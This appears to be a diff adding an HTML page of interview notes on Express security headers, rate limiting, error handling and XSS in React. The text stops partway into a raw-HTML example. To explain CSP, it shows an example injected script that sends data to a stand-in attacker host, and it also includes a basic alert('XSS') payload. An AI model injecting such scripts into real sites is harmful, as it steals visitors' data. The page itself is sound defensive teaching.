@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Security Headers, Rate Limiting & XSS — Interview Notes</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { background: #f6f7fb; font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif; color: #1a1a1a; }
+.container { width: 92%; max-width: 1200px; margin: 60px auto; }
+
+@media (max-width: 768px) {
+  .container { width: 100%; max-width: 100%; margin: 20px 0 40px; }
+}
+
+/* THEME VARIABLES */
+.theme-blue { --accent-dark:#1e3a8a; --accent:#2563eb; --accent-light:#3b82f6; --content-bg:#eff6ff; --heading:#1e3a8a; --shadow-rgb:37,99,235; }
+.cat-1 { --accent-dark:#1e3a8a; --accent:#2563eb; --accent-light:#3b82f6; --content-bg:#eff6ff; --heading:#1e3a8a; --shadow-rgb:37,99,235; }
+.cat-2 { --accent-dark:#065f46; --accent:#059669; --accent-light:#10b981; --content-bg:#ecfdf5; --heading:#065f46; --shadow-rgb:5,150,105; }
+.cat-3 { --accent-dark:#0e7490; --accent:#0891b2; --accent-light:#22d3ee; --content-bg:#ecfeff; --heading:#0e7490; --shadow-rgb:8,145,178; }
+.cat-4 { --accent-dark:#5b21b6; --accent:#7c3aed; --accent-light:#8b5cf6; --content-bg:#f5f3ff; --heading:#5b21b6; --shadow-rgb:124,58,237; }
+.cat-5 { --accent-dark:#9f1239; --accent:#e11d48; --accent-light:#fb7185; --content-bg:#fff1f2; --heading:#9f1239; --shadow-rgb:225,29,72; }
+
+/* HEADER */
+.header { background: linear-gradient(120deg, var(--accent-dark), var(--accent-light)); border-radius:16px; padding:40px 36px; margin-bottom:50px; box-shadow: 0 12px 30px rgba(var(--shadow-rgb),0.3); }
+.header h1 { color:#fff; font-size:34px; margin-bottom:8px; font-weight:800; letter-spacing:-0.5px; }
+.header p { color:#fdf6ec; font-size:17px; margin-bottom:24px; }
+.toc { display:flex; flex-wrap:wrap; gap:8px; }
+.toc a { text-decoration:none; padding:7px 16px; border-radius:20px; font-size:14px; font-weight:600; transition:all .2s ease; cursor:pointer; background:rgba(255,255,255,0.18); color:#fff; border:1px solid rgba(255,255,255,0.35); }
+.toc a:hover { background:#fff; color:var(--accent); }
+
+/* KEY TERMS SUMMARY */
+.intro-summary { margin:0 0 50px; }
+.intro-summary-title { font-size:22px; font-weight:800; color:#1a1a1a; margin-bottom:16px; display:flex; align-items:center; gap:8px; }
+.summary-grid { display:flex; flex-direction:column; gap:10px; }
+.summary-item { display:flex; align-items:center; gap:14px; width:100%; border-radius:10px; padding:14px 20px; }
+.summary-icon { flex-shrink:0; width:40px; height:40px; border-radius:10px; display:flex; align-items:center; justify-content:center; font-size:19px; background:rgba(255,255,255,0.55); box-shadow: inset 0 0 0 1px rgba(255,255,255,0.6); }
+.summary-text { font-size:15px; line-height:1.7; font-weight:500; }
+.summary-text strong { font-weight:800; margin-right:4px; }
+.summary-teal   { background:linear-gradient(135deg,#f0fdfa,#ccfbf1); color:#115e59; } .summary-teal .summary-text strong { color:#0d9488; }
+.summary-pink   { background:linear-gradient(135deg,#fdf2f8,#fce7f3); color:#9d174d; } .summary-pink .summary-text strong { color:#db2777; }
+.summary-indigo { background:linear-gradient(135deg,#eef2ff,#e0e7ff); color:#3730a3; } .summary-indigo .summary-text strong { color:#4338ca; }
+.summary-orange { background:linear-gradient(135deg,#ecfeff,#cffafe); color:#0e7490; } .summary-orange .summary-text strong { color:#0891b2; }
+.summary-rose   { background:linear-gradient(135deg,#fff1f2,#ffe4e6); color:#9f1239; } .summary-rose .summary-text strong { color:#e11d48; }
+.summary-purple { background:linear-gradient(135deg,#f5f3ff,#ede9fe); color:#5b21b6; } .summary-purple .summary-text strong { color:#7c3aed; }
+
+/* SECTION DIVIDER */
+.section-divider { margin:48px 0 24px; position:relative; }
+.section-divider::before { content:''; position:absolute; top:50%; left:0; right:0; height:2px; background:linear-gradient(90deg,#6366f1,#ec4899,#f59e0b); opacity:.25; }
+.section-divider span { background:#f6f7fb; padding:0 16px 0 0; position:relative; font-size:22px; font-weight:800; color:#1a1a1a; }
+
+/* CODE / TOKEN */
+code, .token {
+  font-family: "SF Mono", "Fira Code", "Cascadia Code", Consolas, monospace;
+  font-size: 0.88em;
+  background: rgba(0,0,0,0.06);
+  padding: 2px 7px;
+  border-radius: 5px;
+  color: #4338ca;
+}
+pre {
+  background: #0d1117;
+  border: 1px solid #2d3a4f;
+  border-radius: 10px;
+  padding: 16px 18px;
+  overflow-x: auto;
+  font-size: 0.85rem;
+  line-height: 1.5;
+  margin: 14px 0;
+  color: #e6edf3;
+}
+pre code { background: none; padding: 0; color: inherit; font-size: 1em; }
+
+/* CODE BLOCK (process.html style) */
+.code-block { background:#1a1a1a; border-radius:10px; overflow:hidden; margin:14px 0; box-shadow:0 6px 16px rgba(0,0,0,0.18); }
+.code-bar { background:#111; padding:8px 14px; display:flex; align-items:center; gap:6px; border-bottom:1px solid #333; }
+.code-bar .dot { width:10px; height:10px; border-radius:50%; }
+.code-bar .dot-red { background:#ff5f57; } .code-bar .dot-grey { background:#febc2e; } .code-bar .dot-green { background:#28c840; }
+.code-bar .filename { color:#999; font-size:12px; margin-left:8px; }
+.code-block pre { padding:18px; overflow-x:auto; margin:0; border:none; border-radius:0; background:transparent; }
+.code-block code { color:#d4d4d4; font-size:15px; font-family:'Fira Code','Consolas',monospace; background:none; padding:0; }
+.kw { color:#c792ea; font-weight:600; } .str { color:#c3e88d; } .fn { color:#82aaff; } .cmt { color:#7a7a7a; font-style:italic; } .num { color:#f78c6c; }
+
+/* OUTPUT BLOCK (process.html style) */
+.output-block { background:#0f172a; border-radius:10px; overflow:hidden; margin:14px 0; box-shadow:0 6px 16px rgba(0,0,0,0.18); }
+.output-bar { background:#0b1220; padding:6px 14px; font-size:11px; font-weight:800; letter-spacing:.5px; text-transform:uppercase; color:#64748b; border-bottom:1px solid #1e293b; }
+.output-block pre { padding:16px 18px; color:#a5f3fc; font-family:'Fira Code','Consolas',monospace; font-size:14.5px; overflow-x:auto; white-space:pre; margin:0; border:none; border-radius:0; background:transparent; }
+
+/* FLOW STEPS */
+.flow { display:flex; flex-direction:column; align-items:center; gap:0; margin:16px 0; font-size:0.95rem; background:#1a2332; border-radius:14px; padding:24px 20px; }
+.flow-step { background:#243044; border:1px solid #34435c; border-radius:10px; padding:11px 20px; text-align:center; min-width:200px; max-width:340px; color:#e7ecf3; font-weight:600; box-shadow:0 2px 8px rgba(0,0,0,0.25); }
+.flow-arrow { color:#60a5fa; font-size:1.3rem; line-height:1.4;  }
+.flow-row { display:flex; flex-wrap:wrap; gap:14px; justify-content:center; margin:16px 0; background:#1a2332; border-radius:14px; padding:22px 20px; }
+.flow-row .flow-step { min-width:150px; }
+.pill { display:inline-block; padding:3px 10px; border-radius:999px; font-size:0.78rem; font-weight:700; }
+.pill.short { background:#d1fae5; color:#065f46; }
+.pill.long { background:#fef3c7; color:#92400e; }
+.pill.danger { background:#fecdd3; color:#9f1239; }
+.pill.indigo { background:#e0e7ff; color:#3730a3; }
+
+/* INFO BOXES */
+.info-box { border-radius:10px; padding:14px 18px; margin:12px 0; font-size:16px; line-height:1.8; font-weight:600; box-shadow: inset 0 0 0 1px rgba(255,255,255,0.5); }
+.box-benefit { background:linear-gradient(135deg,#d1fae5,#a7f3d0); color:#065f46; }
+.box-tip     { background:linear-gradient(135deg,#e0e7ff,#c7d2fe); color:#3730a3; }
+.box-note    { background:linear-gradient(135deg,#e0e7ff,#c7d2fe); color:#3730a3; }
+.box-warning { background:linear-gradient(135deg,#fef3c7,#fde68a); color:#92400e; }
+.box-danger  { background:linear-gradient(135deg,#ffe4e6,#fecdd3); color:#9f1239; }
+
+/* COMPARE (good/bad) */
+.compare { display:grid; grid-template-columns:1fr 1fr; gap:16px; margin:16px 0; }
+@media (max-width:700px){ .compare { grid-template-columns:1fr; } }
+.compare-box { background:#fff; border-radius:14px; padding:18px 20px; border:1px solid rgba(0,0,0,0.06); box-shadow:0 4px 14px rgba(0,0,0,0.05); }
+.compare-box.bad { border-left:5px solid #e11d48; }
+.compare-box.good { border-left:5px solid #059669; }
+.compare-box h4 { font-size:15px; margin-bottom:10px; font-weight:800; }
+.compare-box.bad h4 { color:#be123c; }
+.compare-box.good h4 { color:#047857; }
+.compare-box pre { font-size:0.78rem; margin:0; }
+.compare-box p { margin:8px 0 0; font-size:0.85rem; }
+
+/* SUBSECTIONS */
+.categories-wrap { background: linear-gradient(120deg, #eff6ff 0%, #ecfdf5 35%, #fff7ed 70%, #f5f3ff 100%); border:1px solid rgba(37,99,235,0.16); border-radius:18px; padding:24px; margin-bottom:30px; box-shadow: 0 10px 26px rgba(37,99,235,0.1); }
+.card-sub { border-radius:14px; margin-bottom:16px; overflow:hidden; background:#fff; border:1px solid rgba(var(--shadow-rgb),0.18); box-shadow:0 4px 14px rgba(var(--shadow-rgb),0.1); }
+.card-sub:last-child { margin-bottom:0; }
+.card-sub.no-border { border: none; }
+.card-sub.accent-left { border-left: 5px solid var(--accent); }
+.card-sub-title { display:flex; align-items:center; gap:14px; padding:16px 22px; background: linear-gradient(120deg, var(--content-bg), #ffffff 70%); border-bottom:1px solid rgba(var(--shadow-rgb),0.16); }
+.card-sub-num { flex-shrink:0; width:32px; height:32px; border-radius:10px; display:flex; align-items:center; justify-content:center; font-size:15px; font-weight:800; color:#fff; background:linear-gradient(135deg, var(--accent), var(--accent-light)); box-shadow:0 4px 10px rgba(var(--shadow-rgb),0.35); }
+.card-sub-title h4 { margin:0; font-size:17px; font-weight:800; color:var(--heading); }
+.card-sub-title .stars { margin-left:auto; color:#f59e0b; font-size:13px; letter-spacing:1px; }
+.card-sub-content { padding:20px 24px; background:#fff; }
+.card-sub-content p { color:#333; font-size:16px; line-height:1.8; font-weight:500; margin:0 0 14px; }
+.card-sub-content p:last-child { margin-bottom:0; }
+.card-sub-content p + pre { margin-top:14px; }
+.card-sub-content ul { margin:8px 0 14px 20px; }
+.card-sub-content li { font-size:15px; line-height:1.85; color:#333; font-weight:500; margin-bottom:4px; }
+.card-sub-content h3 { font-size:16px; margin:16px 0 6px; font-weight:800; color:var(--heading); }
+.card-sub-content h3:first-child { margin-top:0; }
+.card-sub-content .info-box:last-child,
+.card-sub-content table:last-child,
+.card-sub-content pre:last-child,
+.card-sub-content .compare:last-child,
+.card-sub-content .flow:last-child,
+.card-sub-content .flow-row:last-child,
+.card-sub-content .header-grid:last-child { margin-bottom:0; }
+
+/* HEADER GRID (helmet headers overview) */
+.header-grid { display:grid; grid-template-columns:1fr; gap:10px; margin:14px 0; }
+@media (min-width:600px) { .header-grid { grid-template-columns:1fr 1fr; } }
+.header-item { background:var(--content-bg,#eff6ff); border:1px solid rgba(var(--shadow-rgb,37,99,235),0.18); border-radius:10px; padding:12px 16px; font-size:14.5px; color:#333; }
+.header-item strong { display:block; color:var(--heading,#1e3a8a); font-size:14px; margin-bottom:4px; }
+
+/* TABLE */
+table { width:100%; border-collapse:separate; border-spacing:0; margin:15px 0; border-radius:14px; overflow:hidden; box-shadow:0 10px 24px rgba(var(--shadow-rgb,37,99,235),0.12); }
+table th { background:linear-gradient(120deg, var(--accent-dark,#1e3a8a), var(--accent,#2563eb)); color:#fff; font-size:16px; font-weight:700; padding:14px 20px; text-align:left; letter-spacing:.2px; }
+table th:first-child { border-top-left-radius:14px; }
+table th:last-child { border-top-right-radius:14px; }
+table td { padding:13px 20px; font-size:15px; font-weight:700; border-bottom:1px solid #e8edf7; color:#28324a; background:#fff; }
+table tr:last-child td { border-bottom:none; }
+table tr:nth-child(even) td { background: var(--content-bg,#eff6ff); }
+table tr:hover td { background: rgba(var(--shadow-rgb,37,99,235),0.15); transition:background .15s ease; }
+table td code { background:rgba(var(--shadow-rgb,37,99,235),0.1); color: var(--heading,#1e3a8a); padding:2px 6px; border-radius:5px; font-family:'Fira Code','Consolas',monospace; font-size:14px; }
+
+/* INTERVIEW Q&A */
+.card { border-radius:14px; margin-bottom:30px; overflow:hidden; box-shadow:0 10px 24px rgba(0,0,0,0.06); border:1px solid rgba(0,0,0,0.04); }
+.card-title { color:#fff; font-size:21px; font-weight:700; padding:18px 26px; display:flex; align-items:center; gap:10px; background:linear-gradient(120deg, var(--accent), var(--accent-light)); }
+.card-content { padding:26px; background: var(--content-bg); }
+.qa-container { display: flex; flex-direction: column; gap: 30px; }
+.qa-item { background: #ffffff; padding: 24px; border-radius: 16px; border: 1px solid rgba(0,0,0,0.08); box-shadow: 0 4px 20px rgba(0,0,0,0.04); }
+.qa-question { font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif; font-size: 20px; font-weight: 700; color: #1e293b; margin-bottom: 16px; display: flex; align-items: flex-start; gap: 12px; }
+.qa-question::before { content: "Q"; background: var(--accent); color: #fff; width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; border-radius: 8px; font-size: 15px; font-weight: 800; flex-shrink:0; }
+.qa-answer { background: #fffef2; padding: 20px; border-left: 4px solid #f59e0b; border-bottom: 1px solid #fcebb6; font-family: -apple-system, 'Segoe UI', Helvetica, Arial, sans-serif; font-size: 17px; line-height: 1.9; color: #000000; font-weight: 600; }
+.qa-answer::before { content: "⚡ Answer"; display: block; font-size: 12px; font-weight: 800; color: #b45309; margin-bottom: 8px; text-transform: uppercase; }
+.qa-answer code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; color: #e11d48; font-weight: 600; }
+.qa-answer pre { margin: 10px 0 0; }
+.qa-answer .code-block code { background:none; padding:0; color:#d4d4d4; font-weight:400; }
+.qa-answer .code-block pre { margin:0; }
+.qa-answer:hover { background: #bfffea !important; }
+.qa-group-title { font-size:16px; font-weight:800; color:var(--heading); margin: 6px 0 -6px; }
+
+footer { text-align:center; padding:30px 20px; color:#9aa3b5; font-size:13px; }
+
+@media (max-width:768px) {
+  .header h1 { font-size:26px; }
+  .toc a { padding:6px 12px; font-size:12px; }
+}
+</style>
+</head>
+<body>
+  <div class="container">
+
+    <!-- HEADER -->
+    <div class="header theme-blue">
+      <h1>Security Headers, Rate Limiting &amp; XSS</h1>
+      <p>Interview notes focused on what the browser actually does — not just memorizing header names.</p>
+      <div class="toc">
+        <a href="#s1" onclick="document.getElementById('s1').scrollIntoView({behavior:'smooth'});return false;">Helmet — Security Headers</a>
+        <a href="#s2" onclick="document.getElementById('s2').scrollIntoView({behavior:'smooth'});return false;">Rate Limiting &amp; Errors</a>
+        <a href="#s3" onclick="document.getElementById('s3').scrollIntoView({behavior:'smooth'});return false;">XSS — Cross-Site Scripting</a>
+        <a href="#qa" onclick="document.getElementById('qa').scrollIntoView({behavior:'smooth'});return false;">Interview Q&amp;A</a>
+      </div>
+    </div>
+
+    <div class="info-box box-tip"><strong>💡 Important framing:</strong> Understand what the browser actually does with each security header — don't just memorize header names.</div>
+
+    <!-- KEY TERMS SUMMARY -->
+    <div class="intro-summary">
+      <div class="intro-summary-title">🔑 Key Terms at a Glance</div>
+      <div class="summary-grid">
+        <div class="summary-item summary-teal">
+          <div class="summary-icon">🛡️</div>
+          <div class="summary-text"><strong>Helmet:</strong> Express middleware that sets several HTTP security headers with one line of code.</div>
+        </div>
+        <div class="summary-item summary-pink">
+          <div class="summary-icon">🔒</div>
+          <div class="summary-text"><strong>CSP:</strong> Tells the browser which sources are allowed to load or execute content — a strong browser-level XSS defense.</div>
+        </div>
+        <div class="summary-item summary-indigo">
+          <div class="summary-icon">⏱️</div>
+          <div class="summary-text"><strong>Rate Limiting:</strong> Caps how many requests a client can make in a time window, returning 429 when exceeded.</div>
+        </div>
+        <div class="summary-item summary-orange">
+          <div class="summary-icon">⚔️</div>
+          <div class="summary-text"><strong>XSS:</strong> Untrusted input gets interpreted by the browser as executable HTML/JavaScript instead of plain data.</div>
+        </div>
+        <div class="summary-item summary-rose">
+          <div class="summary-icon">🎭</div>
+          <div class="summary-text"><strong>Clickjacking:</strong> Hiding your site inside an invisible iframe to trick users into unintended clicks.</div>
+        </div>
+        <div class="summary-item summary-purple">
+          <div class="summary-icon">🧼</div>
+          <div class="summary-text"><strong>DOMPurify:</strong> Sanitizes untrusted HTML before it's safely inserted with dangerouslySetInnerHTML.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ==================== 1: HELMET ==================== -->
+    <div class="section-divider" id="s1"><span>1. Helmet — Security Headers</span></div>
+
+    <div class="categories-wrap">
+
+    <div class="card-sub cat-1 no-border">
+      <div class="card-sub-title"><h4>What Helmet Does</h4><span class="stars">★★★★★</span></div>
+      <div class="card-sub-content">
+        <p>Helmet is an Express middleware that sets several HTTP security headers. The browser receives these headers with the response and changes its behavior accordingly.</p>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">app.js</span></div>
+          <pre><code><span class="kw">import</span> helmet <span class="kw">from</span> <span class="str">"helmet"</span>;
+
+app.<span class="fn">use</span>(<span class="fn">helmet</span>());</code></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="card-sub cat-1 accent-left">
+      <div class="card-sub-title"><h4>Content-Security-Policy (CSP)</h4></div>
+      <div class="card-sub-content">
+        <p>CSP tells the browser <strong>which sources are allowed</strong> to load or execute content. It's one of the strongest browser-level defenses against XSS.</p>
+        <div class="info-box box-warning">
+          <strong>Imagine an attacker injects:</strong>
+          <div class="code-block">
+            <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">malicious-injection</span></div>
+            <pre><code>&lt;<span class="kw">script</span>&gt;
+  <span class="fn">fetch</span>(<span class="str">"https://attacker.com/steal"</span>);
+&lt;/<span class="kw">script</span>&gt;</code></pre>
+          </div>
+          <p style="margin:10px 0 0;font-weight:500">With a proper CSP, the browser can refuse to execute scripts that don't come from an allowed source.</p>
+        </div>
+        <p>Example policy:</p>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">response header</span></div>
+          <pre><code><span class="kw">Content-Security-Policy:</span> <span class="str">default-src 'self'; script-src 'self'</span></code></pre>
+        </div>
+        <ul>
+          <li><code>default-src 'self'</code> → resources should generally come from your own origin</li>
+          <li><code>script-src 'self'</code> → JavaScript should come from your own origin</li>
+        </ul>
+        <div class="info-box box-warning"><strong>⚠️ CSP doesn't prevent injection</strong> of the malicious string. It gives the browser a policy for refusing to execute unauthorized content. XSS protection must be layered:<br><br><strong>Input validation/sanitization + React's escaping + CSP → Defense in depth</strong></div>
+      </div>
+    </div>
+
+    <div class="card-sub cat-1">
+      <div class="card-sub-title"><h4>X-Content-Type-Options: nosniff</h4></div>
+      <div class="card-sub-content">
+        <p><strong>MIME sniffing</strong> is when a browser ignores the declared <code>Content-Type</code> and tries to guess the content type itself — dangerous if an attacker uploads content that the browser then interprets differently than intended.</p>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">response header</span></div>
+          <pre><code><span class="kw">X-Content-Type-Options:</span> <span class="str">nosniff</span></code></pre>
+        </div>
+        <p>Tells the browser: don't guess — respect the declared MIME type.</p>
+        <div class="info-box box-tip">🎤 <strong>Interview answer:</strong> <code>X-Content-Type-Options: nosniff</code> prevents browsers from MIME-sniffing responses and forces them to respect the declared Content-Type.</div>
+      </div>
+    </div>
+
+    <div class="card-sub cat-1 accent-left">
+      <div class="card-sub-title"><h4>Strict-Transport-Security — HSTS</h4></div>
+      <div class="card-sub-content">
+        <p>HSTS tells the browser: <em>"This website should only be accessed using HTTPS."</em></p>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">response header</span></div>
+          <pre><code><span class="kw">Strict-Transport-Security:</span> <span class="str">max-age=31536000</span></code></pre>
+        </div>
+        <p>The browser remembers this policy. Future navigation to <code>http://example.com</code> is automatically upgraded to HTTPS. This helps prevent downgrade attacks.</p>
+        <div class="info-box box-warning"><strong>⚠️ HSTS does not magically enable HTTPS.</strong> Your production app still needs real TLS termination — usually via a reverse proxy/load balancer (Nginx, cloud LB) in front of Node/Express.</div>
+        <div class="info-box box-tip">🎤 <strong>Interview answer:</strong> HSTS tells browsers to use HTTPS for the site for a specified period, helping prevent downgrade attacks and accidental insecure HTTP connections.</div>
+      </div>
+    </div>
+
+    <div class="card-sub cat-1">
+      <div class="card-sub-title"><h4>X-Frame-Options — Clickjacking Protection</h4></div>
+      <div class="card-sub-content">
+        <p><strong>Clickjacking</strong> is when an attacker places your site inside an invisible/disguised <code>&lt;iframe&gt;</code> and tricks the user into clicking something they didn't intend — e.g. a fake "Download" button that's actually an invisible "Delete Account" button underneath.</p>
+        <div class="flow-row">
+          <div class="flow-step"><code>X-Frame-Options: DENY</code><br><span style="font-weight:400;font-size:0.85rem;opacity:0.75">No framing at all</span></div>
+          <div class="flow-step"><code>X-Frame-Options: SAMEORIGIN</code><br><span style="font-weight:400;font-size:0.85rem;opacity:0.75">Same-origin framing only</span></div>
+        </div>
+        <div class="info-box box-benefit">✅ <strong>Modern approach:</strong> Prefer CSP's more flexible option:<br><code>Content-Security-Policy: frame-ancestors 'self'</code><br>Most teams set both for backward compatibility.</div>
+      </div>
+    </div>
+
+    <div class="card-sub cat-1 accent-left">
+      <div class="card-sub-title"><h4>Other Important Helmet Headers</h4></div>
+      <div class="card-sub-content">
+        <div class="header-grid">
+          <div class="header-item"><strong>Content-Security-Policy</strong>Controls allowed content sources; helps mitigate XSS</div>
+          <div class="header-item"><strong>X-Content-Type-Options</strong>Prevents MIME sniffing</div>
+          <div class="header-item"><strong>Strict-Transport-Security</strong>Forces HTTPS usage in supporting browsers</div>
+          <div class="header-item"><strong>X-Frame-Options</strong>Helps prevent clickjacking</div>
+          <div class="header-item"><strong>Referrer-Policy</strong>Controls how much referrer information is sent</div>
+          <div class="header-item"><strong>Permissions-Policy</strong>Controls access to browser features</div>
+          <div class="header-item"><strong>Cross-Origin-Opener-Policy</strong>Helps isolate browsing contexts</div>
+          <div class="header-item"><strong>Cross-Origin-Resource-Policy</strong>Controls cross-origin resource loading</div>
+        </div>
+        <p style="margin-top:14px;color:#6b7280;font-weight:500">You normally don't configure all of these individually — <code>app.use(helmet())</code> provides sensible defaults. Customize only where your app requires it.</p>
+      </div>
+    </div>
+
+    </div>
+
+    <!-- ==================== 2: RATE LIMITING ==================== -->
+    <div class="section-divider" id="s2"><span>2. Rate Limiting + Error Handling</span></div>
+
+    <div class="categories-wrap">
+
+    <div class="card-sub cat-2 no-border">
+      <div class="card-sub-title"><h4>Rate Limiting</h4><span class="stars">★★★★★</span></div>
+      <div class="card-sub-content">
+        <p>Include error handling right after rate limiting in your backend architecture — both are core Express middleware pieces.</p>
+        <div class="flow">
+          <div class="flow-step">Request arrives</div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step">Rate Limiter checks</div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-row" style="background:transparent;padding:0;margin:0">
+            <div class="flow-step" style="border-color:#34d399;color:#6ee7b7">Yes → next()</div>
+            <div class="flow-step" style="border-color:#f87171;color:#fca5a5">No → 429</div>
+          </div>
+        </div>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">rate-limiter.js</span></div>
+          <pre><code><span class="kw">import</span> rateLimit <span class="kw">from</span> <span class="str">"express-rate-limit"</span>;
+
+<span class="kw">const</span> loginLimiter = <span class="fn">rateLimit</span>({
+  windowMs: <span class="num">15</span> * <span class="num">60</span> * <span class="num">1000</span>, <span class="cmt">// 15 minutes</span>
+  max: <span class="num">5</span>,                    <span class="cmt">// 5 attempts</span>
+});
+
+app.<span class="fn">use</span>(<span class="str">"/login"</span>, loginLimiter);</code></pre>
+        </div>
+        <p>Exceeding the limit returns <span class="pill danger">429 Too Many Requests</span>.</p>
+      </div>
+    </div>
+
+    <div class="card-sub cat-2 accent-left">
+      <div class="card-sub-title"><h4>Error Handling</h4></div>
+      <div class="card-sub-content">
+        <p>Instead of try/catch in every controller:</p>
+        <div class="compare">
+          <div class="compare-box bad">
+            <h4>❌ Per-route handling</h4>
+            <div class="code-block">
+              <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">per-route.js</span></div>
+              <pre><code>app.<span class="fn">get</span>(<span class="str">"/users"</span>, <span class="kw">async</span> (req, res) => {
+  <span class="kw">try</span> {
+    <span class="cmt">// ...</span>
+  } <span class="kw">catch</span> (error) {
+    res.<span class="fn">status</span>(<span class="num">500</span>).<span class="fn">json</span>({
+      message: error.message
+    });
+  }
+});</code></pre>
+            </div>
+          </div>
+          <div class="compare-box good">
+            <h4>✅ Centralized middleware</h4>
+            <div class="code-block">
+              <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">error-handler.js</span></div>
+              <pre><code>app.<span class="fn">use</span>((err, req, res, next) => {
+  console.<span class="fn">error</span>(err);
+  res.<span class="fn">status</span>(err.statusCode || <span class="num">500</span>)
+    .<span class="fn">json</span>({
+      message: err.message
+        || <span class="str">"Internal Server Error"</span>
+    });
+});</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="info-box box-tip">💡 The signature <code>(err, req, res, next)</code> — <strong>exactly four parameters</strong> — is what identifies it as error-handling middleware in Express.</div>
+      </div>
+    </div>
+
+    <div class="card-sub cat-2">
+      <div class="card-sub-title"><h4>Security Consideration</h4></div>
+      <div class="card-sub-content">
+        <div class="compare">
+          <div class="compare-box bad">
+            <h4>❌ Bad — leaks internals</h4>
+            <div class="code-block">
+              <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">unsafe-response.js</span></div>
+              <pre><code>res.<span class="fn">status</span>(<span class="num">500</span>).<span class="fn">json</span>({
+  error: err.stack
+});</code></pre>
+            </div>
+            <p>Can expose file paths, DB details, stack traces.</p>
+          </div>
+          <div class="compare-box good">
+            <h4>✅ Better — safe response</h4>
+            <div class="code-block">
+              <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">safe-response.js</span></div>
+              <pre><code>res.<span class="fn">status</span>(<span class="num">500</span>).<span class="fn">json</span>({
+  message: <span class="str">"Internal Server Error"</span>
+});</code></pre>
+            </div>
+            <p>Log details server-side; return a generic message.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card-sub cat-2 accent-left">
+      <div class="card-sub-title"><h4>Backend Flow</h4></div>
+      <div class="card-sub-content">
+        <div class="flow">
+          <div class="flow-step">Client Request</div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step">Rate Limiter → Helmet → CORS</div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step">Auth → Authorization → Validation</div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step">Controller → Database</div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step">Error? → Central Error Handler → Safe Response</div>
+        </div>
+      </div>
+    </div>
+
+    </div>
+
+    <!-- ==================== 3: XSS ==================== -->
+    <div class="section-divider" id="s3"><span>3. XSS — Cross-Site Scripting</span></div>
+
+    <div class="categories-wrap">
+
+    <div class="card-sub cat-3 no-border">
+      <div class="card-sub-title"><h4>What Exactly Happens in an XSS Attack?</h4><span class="stars">★★★★★</span></div>
+      <div class="card-sub-content">
+        <p>Especially important with React + Node.js stacks. The fundamental problem: <strong>untrusted user input gets interpreted by the browser as executable HTML/JavaScript</strong> instead of ordinary data.</p>
+        <div class="flow">
+          <div class="flow-step">Attacker submits malicious input</div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step">Node/Express API → Database</div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step">React renders it as HTML/JS</div>
+          <div class="flow-arrow">↓</div>
+          <div class="flow-step" style="border-color:#f87171;color:#fca5a5">Browser executes the script</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="card-sub cat-3 accent-left">
+      <div class="card-sub-title"><h4>Why React Is Safer By Default</h4></div>
+      <div class="card-sub-content">
+        <p>React automatically escapes values inserted through normal JSX expressions.</p>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">Component.jsx</span></div>
+          <pre><code><span class="kw">const</span> username = <span class="str">"&lt;script&gt;alert('XSS')&lt;/script&gt;"</span>;
+
+<span class="kw">return</span> &lt;div&gt;{username}&lt;/div&gt;;</code></pre>
+        </div>
+        <p>React does <strong>not</strong> interpret the value as HTML. The browser effectively receives:</p>
+        <div class="code-block">
+          <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">rendered output</span></div>
+          <pre><code>&lt;div&gt;&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;&lt;/div&gt;</code></pre>
+        </div>
+        <p>The user sees the literal text, not executed JavaScript.</p>
+        <div class="compare">
+          <div class="compare-box good">
+            <h4>✅ Safe — data</h4>
+            <div class="code-block">
+              <div class="code-bar"><span class="dot dot-red"></span><span class="dot dot-grey"></span><span class="dot dot-green"></span><span class="filename">safe.jsx</span></div>
+              <pre><code>&lt;div&gt;{userInput}&lt;/div&gt;</code></pre>
+            </div>
+            <p>Treat as data → React escapes it.</p>
+          </div>
+          <div class="compare-box bad">
+            <h4>❌ Dangerous — raw HTML</h4>
+            <div class="code-block">
